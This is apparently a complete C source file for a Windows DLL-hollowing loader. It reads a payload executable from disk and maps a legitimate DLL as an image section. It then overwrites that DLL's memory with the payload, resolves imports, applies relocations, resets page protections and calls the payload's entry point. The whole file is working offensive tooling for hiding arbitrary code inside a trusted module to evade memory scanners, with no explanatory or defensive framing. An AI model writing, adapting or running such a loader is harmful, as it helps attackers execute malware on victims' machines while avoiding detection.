#include "DllHollowing.h"

BOOL ReadTargetFileW
(
	_In_ LPCWSTR PeName,
	_Out_ LPVOID* lpBuffer
)
{

	HANDLE	hFile					= NULL;
	BOOL	State					= TRUE;
	DWORD	lpNumberOfBytesRead		= 0;
	DWORD	NumberOfBytesRead		= 0;

	if (!PeName || !lpBuffer)
		return FALSE;

	if (!(hFile = CreateFileW(PeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) || hFile == INVALID_HANDLE_VALUE)
	{
		PRINT_ERROR("CreateFileA");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] Current File Handle", hFile);

	if (!(NumberOfBytesRead = GetFileSize(hFile, NULL)) || NumberOfBytesRead == INVALID_FILE_SIZE)
	{
		PRINT_ERROR("GetFileSize");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[%ld] Current File Size", NumberOfBytesRead);

	if (!(*lpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, NumberOfBytesRead)) || *lpBuffer == NULL)
	{
		PRINT_ERROR("HeapAlloc");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[%ld] Allocated Bytes to Buffer", NumberOfBytesRead);

	if (!ReadFile(hFile, *lpBuffer, NumberOfBytesRead, &lpNumberOfBytesRead, NULL))
	{
		PRINT_ERROR("ReadFile");
		State = FALSE; goto _END_FUNC;
	}

	OKAY("Successfully Read File!");

_END_FUNC:

	if (hFile)
		CloseHandle(hFile);

	return State;

}

BOOL ResolveIAT
(
	_In_ PVOID ImageBase,
	_In_ PIMAGE_DATA_DIRECTORY IatRva
)
{

	PIMAGE_THUNK_DATA			pOriginalThunkData			= NULL;
	PIMAGE_THUNK_DATA			pFirstThunkData				= NULL;

	PIMAGE_IMPORT_DESCRIPTOR	pImageImportDescriptor		= NULL;
	PIMAGE_IMPORT_BY_NAME		pImageImportByName			= NULL;

	PCHAR						ImportModuleName			= NULL;
	HMODULE						ImportModule				= NULL;

	PVOID						Function					= NULL;
	LPVOID						ImportAddressTableDirectory = NULL;


	ImportAddressTableDirectory = C_PTR(U_PTR(ImageBase) + IatRva->VirtualAddress);

	for (pImageImportDescriptor = ImportAddressTableDirectory; pImageImportDescriptor->Name != 0; ++pImageImportDescriptor)
	{

		pOriginalThunkData	= C_PTR(U_PTR(ImageBase) + pImageImportDescriptor->OriginalFirstThunk);
		pFirstThunkData		= C_PTR(U_PTR(ImageBase) + pImageImportDescriptor->FirstThunk);
		ImportModuleName	= C_PTR(U_PTR(ImageBase) + pImageImportDescriptor->Name);

		if (!(ImportModule = LoadLibraryA(ImportModuleName)))
			return FALSE;

		for (; pOriginalThunkData->u1.AddressOfData != 0; ++pOriginalThunkData, ++pFirstThunkData)
		{

			if (pOriginalThunkData->u1.Function == 0 && pFirstThunkData->u1.Function == 0)
				break;

			if (IMAGE_SNAP_BY_ORDINAL(pOriginalThunkData->u1.Ordinal))
			{

				if (!(Function = GetProcAddress(ImportModule, (LPCSTR)IMAGE_ORDINAL(pOriginalThunkData->u1.Ordinal))) || Function == NULL)
					return FALSE;

				if (Function != NULL)
					pFirstThunkData->u1.Function = (ULONGLONG)Function;

			}
			else
			{

				pImageImportByName = C_PTR(U_PTR(ImageBase) + pOriginalThunkData->u1.AddressOfData);
				if (!(Function = GetProcAddress(ImportModule, pImageImportByName->Name)) || Function == NULL)
					return FALSE;

				if (Function != NULL)
					pFirstThunkData->u1.Function = (ULONGLONG)Function;

			}

		}

	}

	return TRUE;

}

BOOL RelocSections
(
	_In_ DWORD RVA,
	_In_ PVOID ImageBase,
	_In_ DWORD_PTR Delta
)
{

	PIMAGE_BASE_RELOCATION	Reloc = NULL;
	PBASE_RELOCATION_ENTRY	RelocEntry = NULL;
	DWORD					Size = 0;

	if (RVA)
	{
		Reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)ImageBase + RVA);

		while (Reloc->VirtualAddress)
		{

			Size = (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
			RelocEntry = (PBASE_RELOCATION_ENTRY)(Reloc + 1);

			for (DWORD i = 0; i < Size; i++)
			{

				if (RelocEntry[i].Type == IMAGE_REL_BASED_DIR64)
				{
					ULONGLONG* PatchedAddress = (ULONGLONG*)((PBYTE)ImageBase + Reloc->VirtualAddress + RelocEntry[i].Offset);
					*PatchedAddress += (ULONGLONG)Delta;
				}

				else if (RelocEntry[i].Type == IMAGE_REL_BASED_HIGHLOW)
				{
					DWORD* PatchedAddress = (DWORD*)((PBYTE)ImageBase + Reloc->VirtualAddress + RelocEntry[i].Offset);
					*PatchedAddress += (DWORD)Delta;
				}

				else if (RelocEntry[i].Type == IMAGE_REL_BASED_HIGH)
				{
					WORD* PatchedAddress = (WORD*)((PBYTE)ImageBase + Reloc->VirtualAddress + RelocEntry[i].Offset);
					*PatchedAddress += HIWORD(Delta);
				}

				else if (RelocEntry[i].Type == IMAGE_REL_BASED_LOW)
				{
					WORD* PatchedAddress = (WORD*)((PBYTE)ImageBase + Reloc->VirtualAddress + RelocEntry[i].Offset);
					*PatchedAddress += LOWORD(Delta);
				}

				else if (RelocEntry[i].Type == IMAGE_REL_BASED_ABSOLUTE)
				{
					break;
				}

			}
			Reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)Reloc + Reloc->SizeOfBlock);

		}

	}

	return TRUE;

}

BOOL ChangeMemoryProtection
(
	_In_ PVOID TargetBaseAddress,
	_In_ PIMAGE_NT_HEADERS pImgNt
)
{


	PIMAGE_SECTION_HEADER pImgSec = IMAGE_FIRST_SECTION(pImgNt);

	for (int i = 0; i < pImgNt->FileHeader.NumberOfSections; i++)
	{

		ULONG ulProtection = 0;
		ULONG ulOldProt = 0;

		if (pImgSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			ulProtection = PAGE_EXECUTE;

		if (pImgSec[i].Characteristics & IMAGE_SCN_MEM_READ)
			ulProtection = PAGE_READONLY;

		if (pImgSec[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			ulProtection = PAGE_WRITECOPY;

		if ((pImgSec[i].Characteristics & IMAGE_SCN_MEM_READ) && (pImgSec[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			ulProtection = PAGE_READWRITE;

		if ((pImgSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSec[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			ulProtection = PAGE_EXECUTE_WRITECOPY;

		if ((pImgSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSec[i].Characteristics & IMAGE_SCN_MEM_READ))
			ulProtection = PAGE_EXECUTE_READ;

		if ((pImgSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSec[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSec[i].Characteristics & IMAGE_SCN_MEM_READ))
			ulProtection = PAGE_EXECUTE_READWRITE;

		PVOID BaseAddress = C_PTR((U_PTR(TargetBaseAddress) + pImgSec[i].VirtualAddress));
		SIZE_T Size = pImgSec[i].SizeOfRawData;

		if (!VirtualProtect(BaseAddress, Size, ulProtection, &ulOldProt))
		{
			return FALSE;
		}

	}

	return TRUE;

}

BOOL OverwriteDll
(
	_In_ PVOID Buffer,
	_In_ SIZE_T BufferSize,
	_In_ PVOID DllPayloadAddress,
	_In_ SIZE_T DllImageSize
)
{

	DWORD OldProtection = 0;

	if (!VirtualProtect(DllPayloadAddress, DllImageSize, PAGE_READWRITE, &OldProtection))
	{
		WARN("Failed To Change Memory Permissions for Dll!");
		PRINT_ERROR("VirtualProtect");
		return FALSE;
	}

	memset(DllPayloadAddress, 0, DllImageSize);
	memcpy(DllPayloadAddress, Buffer, BufferSize);

	return TRUE;

}

BOOL MapDll
(
	_In_ pWin32 Win32,
	_In_ LPCWSTR DllFileName,
	_Out_ PVOID* DllPayloadAddress,
	_Out_ SIZE_T* DllImageSize
)
{

	PIMAGE_NT_HEADERS64 pImageNtHeader = NULL;
	NTSTATUS Status = STATUS_SUCCESS;
	HANDLE FileHandle = NULL;
	HANDLE SectionHandle = NULL;
	PVOID DllBaseAddress = NULL;
	SIZE_T ViewSize = 0;

	if (!(FileHandle = CreateFileW(DllFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) || FileHandle == INVALID_HANDLE_VALUE)
	{
		PRINT_ERROR("CreateFileW");
		return FALSE;
	}

	if (!NT_SUCCESS(Status = Win32->Ntapi.NtCreateSection(&SectionHandle, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, FileHandle)) || SectionHandle == NULL)
	{
		NTERROR("NtCreateSection");
		return FALSE;
	}

	if (!NT_SUCCESS(Status = Win32->Ntapi.NtMapViewOfSection(SectionHandle, NtCurrentProcess(), &DllBaseAddress, 0, 0, NULL, &ViewSize, ViewShare, 0, PAGE_EXECUTE_READ)))
	{
		NTERROR("NtMapViewOfSection");
		return FALSE;
	}

	pImageNtHeader = (PIMAGE_NT_HEADERS64)(U_PTR(DllBaseAddress) + ((PIMAGE_DOS_HEADER)DllBaseAddress)->e_lfanew);

	*DllPayloadAddress = DllBaseAddress;
	*DllImageSize = pImageNtHeader->OptionalHeader.SizeOfImage;

	return TRUE;

}

BOOL DllHollowExecution
(
	_In_ LPCWSTR TargetDll,
	_In_ LPVOID TargetPayloadBuffer
)
{
	
	Win32					DllHollowingApi = { 0 };
	HMODULE					Ntdll			= NULL;
	PIMAGE_NT_HEADERS64		pImageNtHeader	= NULL;
	DWORD_PTR				Delta			= 0;
	PVOID					ImageBase		= NULL;
	PVOID					EntryPoint		= NULL;
	DWORD					RelocRva		= 0;

	PVOID DllBaseAddress					= NULL;
	SIZE_T DllImageSize						= 0;

	MAIN EntryMain							= NULL;
	fnDllMain EntryDllMain					= NULL;

	pImageNtHeader = (PIMAGE_NT_HEADERS64)(U_PTR(TargetPayloadBuffer) + ((PIMAGE_DOS_HEADER)TargetPayloadBuffer)->e_lfanew);
	if (pImageNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		WARN("Nt Signatures do not match!");
		return FALSE;
	}

	DllHollowingApi.Module.Ntdll				= GetModuleHandleW(L"Ntdll.dll");

	DllHollowingApi.Ntapi.NtCreateSection		= (pNtCreateSection)GetProcAddress(DllHollowingApi.Module.Ntdll, "NtCreateSection");
	DllHollowingApi.Ntapi.NtMapViewOfSection	= (pNtMapViewOfSection)GetProcAddress(DllHollowingApi.Module.Ntdll, "NtMapViewOfSection");

	DllHollowingApi.PeHeaders.pImgNtHdrs		= pImageNtHeader;
	DllHollowingApi.PeHeaders.pImgSecHdr		= IMAGE_FIRST_SECTION(DllHollowingApi.PeHeaders.pImgNtHdrs);

	DllHollowingApi.PeHeaders.pEntryImportDataDir		= &DllHollowingApi.PeHeaders.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	DllHollowingApi.PeHeaders.pEntryExportDataDir		= &DllHollowingApi.PeHeaders.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	DllHollowingApi.PeHeaders.pEntryBaseRelocDataDir	= &DllHollowingApi.PeHeaders.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DllHollowingApi.PeHeaders.pEntryExceptionDataDir	= &DllHollowingApi.PeHeaders.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	DllHollowingApi.PeHeaders.pEntryTLSDataDir			= &DllHollowingApi.PeHeaders.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

	if (!MapDll(&DllHollowingApi, TargetDll, &DllBaseAddress, &DllImageSize))
	{
		PRINT_ERROR("MapDll");
		return FALSE;
	}

	INFO("[0x%p] [%zu] Dll Base Address", DllBaseAddress, DllImageSize);

	if (!(ImageBase = VirtualAlloc(NULL, DllHollowingApi.PeHeaders.pImgNtHdrs->OptionalHeader.SizeOfImage, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)) || ImageBase == NULL)
	{
		PRINT_ERROR("VirtualAlloc");
		return FALSE; // no point of continuing
	}

	INFO("[0x%p] Base Address", ImageBase);
	INFO("[%d] Size of Image", DllHollowingApi.PeHeaders.pImgNtHdrs->OptionalHeader.SizeOfImage);

	for (DWORD i = 0; i < DllHollowingApi.PeHeaders.pImgNtHdrs->FileHeader.NumberOfSections; i++)
	{

		if (DllHollowingApi.PeHeaders.pImgSecHdr[i].SizeOfRawData == 0)
			continue;

		memcpy
		(
			C_PTR((U_PTR(ImageBase) + DllHollowingApi.PeHeaders.pImgSecHdr[i].VirtualAddress)),
			C_PTR((U_PTR(TargetPayloadBuffer) + DllHollowingApi.PeHeaders.pImgSecHdr[i].PointerToRawData)),
			DllHollowingApi.PeHeaders.pImgSecHdr[i].SizeOfRawData
		);

	}

	Delta = (U_PTR(DllBaseAddress) - DllHollowingApi.PeHeaders.pImgNtHdrs->OptionalHeader.ImageBase);
	RelocRva = DllHollowingApi.PeHeaders.pEntryBaseRelocDataDir->VirtualAddress;

	if (!ResolveIAT(ImageBase, DllHollowingApi.PeHeaders.pEntryImportDataDir))
	{
		PRINT_ERROR("ResolveIAT");
		return FALSE;
	}

	INFO("Import Address/Lookup Table Resolved Successfully!");

	if (!OverwriteDll(ImageBase, DllHollowingApi.PeHeaders.pImgNtHdrs->OptionalHeader.SizeOfImage, DllBaseAddress, DllImageSize))
	{
		PRINT_ERROR("OverwriteDll");
		return FALSE;
	}

	INFO("Dll Overwritten!");

	if (!RelocSections(RelocRva, DllBaseAddress, Delta))
	{
		PRINT_ERROR("RelocSections");
		return FALSE;
	}

	INFO("Address Relocations Successfull!");

	if (!ChangeMemoryProtection(DllBaseAddress, DllHollowingApi.PeHeaders.pImgNtHdrs))
	{
		PRINT_ERROR("ChangeMemoryProtection");
		return FALSE;
	}

	INFO("Memory Protections Changed!");

	EntryPoint = C_PTR((U_PTR(DllBaseAddress) + DllHollowingApi.PeHeaders.pImgNtHdrs->OptionalHeader.AddressOfEntryPoint));
	if (!EntryPoint)
		return FALSE;

	INFO("[0x%p] Entry Point", EntryPoint);

//#ifdef DLL
//	EntryDllMain = (fnDllMain)EntryPoint;
//	return EntryDllMain((HINSTANCE)DllBaseAddress, DLL_PROCESS_ATTACH, NULL);
//#else
//	EntryMain = (MAIN)EntryPoint;
//	return EntryMain();
//#endif

	EntryDllMain = (fnDllMain)EntryPoint;
	return EntryDllMain((HINSTANCE)DllBaseAddress, DLL_PROCESS_ATTACH, NULL);

}